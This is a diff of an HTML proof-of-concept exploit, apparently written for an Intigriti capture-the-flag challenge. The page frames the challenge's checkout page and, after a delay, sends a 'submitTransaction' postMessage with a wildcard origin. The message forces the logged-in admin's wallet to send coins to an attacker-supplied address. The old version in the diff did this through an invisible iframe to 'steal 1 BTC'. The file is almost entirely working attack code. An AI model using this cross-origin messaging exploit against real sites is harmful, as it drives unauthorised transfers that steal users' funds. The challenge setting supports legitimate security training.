@@ -1,23 +1,34 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <title>PostMessage Exploit PoC</title>
+</head>
 <body>
-    <iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html" style="opacity:0"></iframe>
-    <script>
-        // REPLACE WITH YOUR **BTC** WALLET ADDRESS
-        const YOUR_BTC_WALLET = "1855baf2107b6439be06127dcae8600e69"; 
+    <h1>"Following the trail of coins..."</h1>
+    <p>Waiting for Admin's wallet to load...</p>
+    
+    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="500" height="500"></iframe>
 
-        document.getElementById('f').onload = () => {
+    <script>
+        window.onload = function() {
+            var targetFrame = document.getElementById('target').contentWindow;
+
+            var maliciousPayload = {
+                type: 'submitTransaction',
+                transaction: {
+                    currency: '1337COIN', // Trying ETH this time
+                    amount: 1337,
+                    toAddress: '10970063d33e32396bb80753a2b902d568' // Your wallet
+                }
+            };
+
+            // WAIT 4 SECONDS before sending the payload. 
+            // This gives the API plenty of time to load the Admin's wallet 
+            // and avoids triggering the blocking alert().
             setTimeout(() => {
-                // Force Admin to send you BTC
-                document.getElementById('f').contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        currency: 'BTC',   // Admin HAS this!
-                        amount: 1,         // Steal 1 BTC
-                        toAddress: YOUR_BTC_WALLET
-                    }
-                }, '*');
-            }, 2000);
+                targetFrame.postMessage(maliciousPayload, '*');
+                console.log("Payload sent!");
+            }, 4000); 
         };
     </script>
 </body>
